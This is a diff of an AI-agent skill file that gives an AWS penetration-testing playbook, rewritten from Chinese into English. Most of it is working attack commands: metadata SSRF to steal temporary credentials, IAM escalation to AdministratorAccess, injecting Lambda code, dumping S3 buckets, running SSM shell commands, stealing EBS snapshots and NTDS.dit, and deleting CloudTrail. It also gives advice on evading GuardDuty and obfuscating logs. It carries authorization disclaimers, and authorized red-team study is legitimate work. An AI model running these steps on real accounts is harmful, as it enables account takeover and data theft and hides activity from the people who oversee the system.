@@ -1,14 +1,14 @@
 ---
 name: aws-penetration-testing
-title: AWS 云环境渗透测试
-description: 当对 AWS 云环境做获授权红队/渗透评估时使用；做 IAM 枚举、提权、元数据 SSRF 取凭证、S3/Lambda/EC2/SSM 利用与持久化并产出审计发现；不适用于无书面授权的测试、纯合规扫描或非 AWS 平台；触发词：AWS渗透、IAM提权、IMDS SSRF、S3桶、Pacu
+title: AWS Penetration Testing
+description: Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations.
 domain: 安全/ops
-triggers: [AWS渗透测试, AWS红队, IAM枚举, IAM提权, 影子管理员, 元数据SSRF, IMDSv1, IMDSv2, 169.254.169.254, S3桶利用, Lambda代码注入, SSM命令执行, EBS快照窃取, CloudTrail绕过, Pacu, enumerate-iam, 临时凭证窃取, 云持久化]
-tags: [安全, ops, 云安全, aws, 渗透测试, 红队, iam, 提权, ssrf, 横向移动]
-level: 精通
+triggers: [IMDSv1, IMDSv2, 169.254.169.254, Pacu, enumerate-iam]
+tags: [ops, aws, iam, ssrf]
+level: advanced
 status: stable
 agents: [claude-code, codex, cursor, gemini-cli]
-tools: [aws-cli, boto3, Pacu, Prowler, ScoutSuite, enumerate-iam, PMapper, SkyArk, curl, aws_consoler, secretsdump.py]
+tools: []
 requires: []
 related: [cloud-penetration-testing, cloud-misconfig-auditor, penetration-testing-methodology, container-security-hardening]
 combines_with: [cloud-misconfig-auditor, red-team-recon, penetration-testing-methodology]
@@ -16,188 +16,405 @@ license: MIT
 source: sickn33/antigravity-awesome-skills
 source_license: MIT
 ---
-> 仅限授权使用：本技能只能用于获授权的安全评估、防御验证或受控教学环境。开始前必须取得书面授权并记录全部操作。
+> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
-## 何时使用
+# AWS Penetration Testing
 
-- 已拿到（哪怕低权限的）AWS 凭证或发现 SSRF 入口，需要在**授权范围内**枚举权限、寻找提权路径、验证横向移动与持久化风险。
-- 需要演示「IAM 配置错误 → 管理员」「EC2 SSRF → 临时凭证」「公开 S3 桶 → 数据泄露」等攻击链，输出审计发现。
-- 前置：AWS CLI 已配置凭证、了解 IAM 模型、Python3 + boto3，工具 Pacu / Prowler / ScoutSuite / SkyArk / enumerate-iam / PMapper。
+## Purpose
 
-不该用的边界：
-- 没有书面授权、或目标不在约定范围内 —— 直接停止。
-- 只想做合规基线扫描（用 Prowler/ScoutSuite 防御视角即可，不必走攻击链）。
-- 非 AWS 平台（Azure/GCP/本地）。
-- 生产数据破坏、永久关闭安全控制、留无记录后门 —— 一律禁止。
+Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations.
 
-## 步骤
+## Inputs/Prerequisites
 
-1. **初始枚举**：确认当前身份与权限，识别落脚点。
-2. **IAM 枚举**：列用户/组/角色及附加策略，寻找提权原语。
-3. **元数据 SSRF（EC2/Fargate）**：通过 SSRF 或本地访问拿临时凭证。
-4. **提权**：利用「影子管理员」权限把自己提到 Administrator。
-5. **资源利用**：S3 桶、Lambda、SSM、EC2/EBS 横向取数据或执行命令。
-6. **持久化与凭证转换**：CLI 凭证转控制台、按授权评估持久化机制。
-7. **清理与取证**：清理测试资源，留审计轨迹（不做永久破坏）。
+- AWS CLI configured with credentials
+- Valid AWS credentials (even low-privilege)
+- Understanding of AWS IAM model
+- Python 3, boto3 library
+- Tools: Pacu, Prowler, ScoutSuite, SkyArk
 
-## 指令
+## Outputs/Deliverables
 
-### 1. 初始枚举
+- IAM privilege escalation paths
+- Extracted credentials and secrets
+- Compromised EC2/Lambda/S3 resources
+- Persistence mechanisms
+- Security audit findings
+
+---
+
+## Essential Tools
+
+| Tool | Purpose | Installation |
+|------|---------|--------------|
+| Pacu | AWS exploitation framework | `git clone https://github.com/RhinoSecurityLabs/pacu` |
+| SkyArk | Shadow Admin discovery | `Import-Module .\SkyArk.ps1` |
+| Prowler | Security auditing | `pip install prowler` |
+| ScoutSuite | Multi-cloud auditing | `pip install scoutsuite` |
+| enumerate-iam | Permission enumeration | `git clone https://github.com/andresriancho/enumerate-iam` |
+| Principal Mapper | IAM analysis | `pip install principalmapper` |
+
+---
+
+## Core Workflow
+
+### Step 1: Initial Enumeration
+
+Identify the compromised identity and permissions:
+
 ```bash
-aws sts get-caller-identity                 # 当前身份
-aws configure --profile compromised         # 配置 profile
-aws iam list-access-keys                     # 列访问密钥
-./enumerate-iam.py --access-key AKIA... --secret-key StF0q...   # 暴力枚举权限
+# Check current identity
+aws sts get-caller-identity
+
+# Configure profile
+aws configure --profile compromised
+
+# List access keys
+aws iam list-access-keys
+
+# Enumerate permissions
+./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
 ```
 
-### 2. IAM 枚举
+### Step 2: IAM Enumeration
+
 ```bash
+# List all users
 aws iam list-users
+
+# List groups for user
 aws iam list-groups-for-user --user-name TARGET_USER
+
+# List attached policies
 aws iam list-attached-user-policies --user-name TARGET_USER
-aws iam list-user-policies --user-name TARGET_USER          # 内联策略
+
+# List inline policies
+aws iam list-user-policies --user-name TARGET_USER
+
+# Get policy details
 aws iam get-policy --policy-arn POLICY_ARN
 aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1
+
+# List roles
 aws iam list-roles
 aws iam list-attached-role-policies --role-name ROLE_NAME
 ```
 
-### 3. 元数据 SSRF
-IMDSv1（无需 token）：
+### Step 3: Metadata SSRF (EC2)
+
+Exploit SSRF to access metadata endpoint (IMDSv1):
+
 ```bash
-http://169.254.169.254/latest/meta-data/iam/security-credentials/          # 取角色名
-http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME # 取临时凭证
-# 返回含 AccessKeyId(ASIA...) / SecretAccessKey / Token / Expiration
+# Access metadata endpoint
+http://169.254.169.254/latest/meta-data/
+
+# Get IAM role name
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Extract temporary credentials
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
+
+# Response contains:
+{
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "...",
+  "Token": "...",
+  "Expiration": "2019-08-01T05:20:30Z"
+}
 ```
-IMDSv2（需 token）：
+
+**For IMDSv2 (token required):**
+
 ```bash
+# Get token first
 TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
   "http://169.254.169.254/latest/api/token")
+
+# Use token for requests
 curl -H "X-aws-ec2-metadata-token:$TOKEN" \
   "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 ```
-Fargate/容器凭证：读 `/proc/self/environ` 取 `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`，再访问 `http://169.254.170.2/v2/credentials/...`。
 
-### 4. 提权（影子管理员权限速查）
-| 权限 | 利用方式 |
-|------|----------|
-| `iam:CreateAccessKey` | 为管理员用户造新密钥 |
-| `iam:CreateLoginProfile` | 给任意用户设登录密码 |
-| `iam:AttachUserPolicy` | 给自己附加 Admin 策略 |
-| `iam:PutUserPolicy` | 注入内联 Admin 策略 |
-| `iam:AddUserToGroup` | 把自己加入管理员组 |
-| `iam:PassRole` + `ec2:RunInstances` | 用 Admin 角色起 EC2 |
-| `lambda:UpdateFunctionCode` | 向 Lambda 注入代码 |
+**Fargate Container Credentials:**
+
+```bash
+# Read environment for credential path
+/proc/self/environ
+# Look for: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...
+
+# Access credentials
+http://169.254.170.2/v2/credentials/CREDENTIAL-PATH
+```
+
+---
+
+## Privilege Escalation Techniques
+
+### Shadow Admin Permissions
+
+These permissions are equivalent to administrator:
+
+| Permission | Exploitation |
+|------------|--------------|
+| `iam:CreateAccessKey` | Create keys for admin user |
+| `iam:CreateLoginProfile` | Set password for any user |
+| `iam:AttachUserPolicy` | Attach admin policy to self |
+| `iam:PutUserPolicy` | Add inline admin policy |
+| `iam:AddUserToGroup` | Add self to admin group |
+| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role |
+| `lambda:UpdateFunctionCode` | Inject code into Lambda |
+
+### Create Access Key for Another User
 
 ```bash
 aws iam create-access-key --user-name target_user
-aws iam attach-user-policy --user-name my_username \
-  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
-aws iam put-user-policy --user-name my_username \
-  --policy-name admin_policy --policy-document file://admin-policy.json
-```
-Lambda 注入（`lambda:UpdateFunctionCode`）：
-```python
-import boto3
-def lambda_handler(event, context):
-    client = boto3.client('iam')
-    return client.attach_user_policy(
-        UserName='my_username',
-        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")
-```
-```bash
-aws lambda update-function-code --function-name target_function --zip-file fileb://malicious.zip
 ```
 
-### 5. 资源利用
-S3：
+### Attach Admin Policy
+
 ```bash
-./bucket_finder.rb --download --region us-east-1 wordlist.txt   # 桶发现
-aws s3 ls && aws s3 ls s3://bucket-name --recursive
-aws s3 sync s3://bucket-name ./local-folder                     # 全量下载
-# 公开桶搜索：https://buckets.grayhatwarfare.com/
+aws iam attach-user-policy --user-name my_username \
+  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 ```
-Lambda：
+
+### Add Inline Admin Policy
+
 ```bash
+aws iam put-user-policy --user-name my_username \
+  --policy-name admin_policy \
+  --policy-document file://admin-policy.json
+```
+
+### Lambda Privilege Escalation
+
+```python
+# code.py - Inject into Lambda function
+import boto3
+
+def lambda_handler(event, context):
+    client = boto3.client('iam')
+    response = client.attach_user_policy(
+        UserName='my_username',
+        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
+    )
+    return response
+```
+
+```bash
+# Update Lambda code
+aws lambda update-function-code --function-name target_function \
+  --zip-file fileb://malicious.zip
+```
+
+---
+
+## S3 Bucket Exploitation
+
+### Bucket Discovery
+
+```bash
+# Using bucket_finder
+./bucket_finder.rb wordlist.txt
+./bucket_finder.rb --download --region us-east-1 wordlist.txt
+
+# Common bucket URL patterns
+https://{bucket-name}.s3.amazonaws.com
+https://s3.amazonaws.com/{bucket-name}
+```
+
+### Bucket Enumeration
+
+```bash
+# List buckets (with creds)
+aws s3 ls
+
+# List bucket contents
+aws s3 ls s3://bucket-name --recursive
+
+# Download all files
+aws s3 sync s3://bucket-name ./local-folder
+```
+
+### Public Bucket Search
+
+```
+https://buckets.grayhatwarfare.com/
+```
+
+---
+
+## Lambda Exploitation
+
+```bash
+# List Lambda functions
 aws lambda list-functions
-aws lambda get-function --function-name FUNCTION_NAME   # 响应含代码下载 URL
+
+# Get function code
+aws lambda get-function --function-name FUNCTION_NAME
+# Download URL provided in response
+
+# Invoke function
 aws lambda invoke --function-name FUNCTION_NAME output.txt
 ```
-SSM 命令执行：
+
+---
+
+## SSM Command Execution
+
+Systems Manager allows command execution on EC2 instances:
+
 ```bash
+# List managed instances
 aws ssm describe-instance-information
+
+# Execute command
 aws ssm send-command --instance-ids "i-0123456789" \
-  --document-name "AWS-RunShellScript" --parameters commands="whoami"
+  --document-name "AWS-RunShellScript" \
+  --parameters commands="whoami"
+
+# Get command output
 aws ssm list-command-invocations --command-id "CMD-ID" \
   --details --query "CommandInvocations[].CommandPlugins[].Output"
 ```
-EC2/EBS（快照窃数据）：
+
+---
+
+## EC2 Exploitation
+
+### Mount EBS Volume
+
 ```bash
+# Create snapshot of target volume
 aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"
+
+# Create volume from snapshot
 aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a
+
+# Attach to attacker instance
 aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf
-sudo mkdir /mnt/stolen && sudo mount /dev/xvdf1 /mnt/stolen
-# Windows DC 影子拷贝：共享快照→挂载→ secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
+
+# Mount and access
+sudo mkdir /mnt/stolen
+sudo mount /dev/xvdf1 /mnt/stolen
 ```
 
-### 6. 凭证转控制台
+### Shadow Copy Attack (Windows DC)
+
+```bash
+# CloudCopy technique
+# 1. Create snapshot of DC volume
+# 2. Share snapshot with attacker account
+# 3. Mount in attacker instance
+# 4. Extract NTDS.dit and SYSTEM
+secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
+```
+
+---
+
+## Console Access from API Keys
+
+Convert CLI credentials to console access:
+
 ```bash
 git clone https://github.com/NetSPI/aws_consoler
-aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY   # 生成控制台登录 URL
+aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY
+
+# Generates signin URL for console access
 ```
 
-### 7. 痕迹处理（仅授权且记录在案）
+---
+
+## Covering Tracks
+
+### Disable CloudTrail
+
 ```bash
+# Delete trail
 aws cloudtrail delete-trail --name trail_name
-aws cloudtrail update-trail --name trail_name --no-include-global-service-events
+
+# Disable global events
+aws cloudtrail update-trail --name trail_name \
+  --no-include-global-service-events
+
+# Disable specific region
+aws cloudtrail update-trail --name trail_name \
+  --no-include-global-service-events --no-is-multi-region-trail
 ```
-注意：Kali/Parrot/Pentoo 的 user-agent 会触发 GuardDuty 告警；Pacu 会改写 user-agent 规避。
 
-## 示例
+**Note:** Kali/Parrot/Pentoo Linux triggers GuardDuty alerts based on user-agent. Use Pacu which modifies the user-agent.
 
-SSRF → 管理员完整链路：
+---
+
+## Quick Reference
+
+| Task | Command |
+|------|---------|
+| Get identity | `aws sts get-caller-identity` |
+| List users | `aws iam list-users` |
+| List roles | `aws iam list-roles` |
+| List buckets | `aws s3 ls` |
+| List EC2 | `aws ec2 describe-instances` |
+| List Lambda | `aws lambda list-functions` |
+| Get metadata | `curl http://169.254.169.254/latest/meta-data/` |
+
+---
+
+## Constraints
+
+**Must:**
+- Obtain written authorization before testing
+- Document all actions for audit trail
+- Test in scope resources only
+
+**Must Not:**
+- Modify production data without approval
+- Leave persistent backdoors without documentation
+- Disable security controls permanently
+
+**Should:**
+- Check for IMDSv2 before attempting metadata attacks
+- Enumerate thoroughly before exploitation
+- Clean up test resources after engagement
+
+---
+
+## Examples
+
+### Example 1: SSRF to Admin
+
 ```bash
-# 1. 在 Web 应用找到 SSRF
+# 1. Find SSRF vulnerability in web app
 https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
-# 2. 从响应拿角色名（如 AdminRole）
-# 3. 取临时凭证
+
+# 2. Get role name from response
+# 3. Extract credentials
 https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
-# 4. 配置被窃凭证
+
+# 4. Configure AWS CLI with stolen creds
 export AWS_ACCESS_KEY_ID=ASIA...
 export AWS_SECRET_ACCESS_KEY=...
 export AWS_SESSION_TOKEN=...
-# 5. 验证
+
+# 5. Verify access
 aws sts get-caller-identity
 ```
 
-## 注意事项
+---
 
-约束（Must / Must Not / Should）：
-- 必须：测试前取得书面授权；记录全部操作以备审计；只动范围内资源。
-- 禁止：未经批准改生产数据；留无记录的持久后门；永久关闭安全控制。
-- 建议：尝试元数据攻击前先确认是 IMDSv1 还是 IMDSv2；充分枚举再利用；交付后清理测试资源。
+## Troubleshooting
 
-排错速查：
-- 所有命令 Access Denied → 用 `enumerate-iam` 枚举实际权限。
-- 元数据端点被拦 → 检查是否 IMDSv2，或改试容器元数据（169.254.170.2）。
-- GuardDuty 告警 → 用 Pacu 自定义 user-agent。
-- 凭证过期 → 临时凭证会轮换，重新从元数据拉取。
-
-常用速查：
-| 任务 | 命令 |
-|------|------|
-| 身份 | `aws sts get-caller-identity` |
-| 列用户 | `aws iam list-users` |
-| 列角色 | `aws iam list-roles` |
-| 列桶 | `aws s3 ls` |
-| 列 EC2 | `aws ec2 describe-instances` |
-| 列 Lambda | `aws lambda list-functions` |
-| 取元数据 | `curl http://169.254.169.254/latest/meta-data/` |
-
-## 互见
-
-- 进阶利用（Secrets Manager & KMS、ECS/EKS/ECR 容器、RDS/DynamoDB、VPC 横向、API Gateway、安全检查清单）：参见源仓库 `references/advanced-aws-pentesting.md`。
-- 防御视角合规扫描：Prowler、ScoutSuite。
+| Issue | Solution |
+|-------|----------|
+| Access Denied on all commands | Enumerate permissions with enumerate-iam |
+| Metadata endpoint blocked | Check for IMDSv2, try container metadata |
+| GuardDuty alerts | Use Pacu with custom user-agent |
+| Expired credentials | Re-fetch from metadata (temp creds rotate) |
+| CloudTrail logging actions | Consider disable or log obfuscation |
 
 ---
-采编自 sickn33/antigravity-awesome-skills（MIT），原作者 zebbern。
+
+## Additional Resources
+
+For advanced techniques including Lambda/API Gateway exploitation, Secrets Manager & KMS, Container security (ECS/EKS/ECR), RDS/DynamoDB exploitation, VPC lateral movement, and security checklists, see [references/advanced-aws-pentesting.md](references/advanced-aws-pentesting.md).
+
+## When to Use
+This skill is applicable to execute the workflow or actions described in the overview.
